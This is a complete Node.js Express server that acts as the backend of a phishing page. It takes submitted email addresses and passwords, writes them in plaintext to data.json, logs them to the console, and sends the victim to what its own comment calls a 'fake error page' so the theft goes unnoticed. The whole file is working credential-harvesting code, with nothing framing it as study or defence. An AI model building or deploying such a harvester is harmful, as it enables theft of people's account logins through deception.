const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static("../public"));

// ✅ Serve frontend files
app.use(express.static(path.join(__dirname, "../public")));

// Handle form submit
app.post("/submit", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send("⚠️ Please enter both email and password!");
  }

  const user = { email, password, time: new Date().toISOString() };

  // Save to data.json
  let data = [];
  if (fs.existsSync("data.json")) {
    data = JSON.parse(fs.readFileSync("data.json"));
  }
  data.push(user);
  fs.writeFileSync("data.json", JSON.stringify(data, null, 2));

  console.log("✅ Data saved:", user);

  // Redirect user to error.html (fake error page)
  res.redirect("/error.html");
});

// Start server
app.listen(3000, () => {
  console.log("🚀 Server running at http://localhost:3000");
});
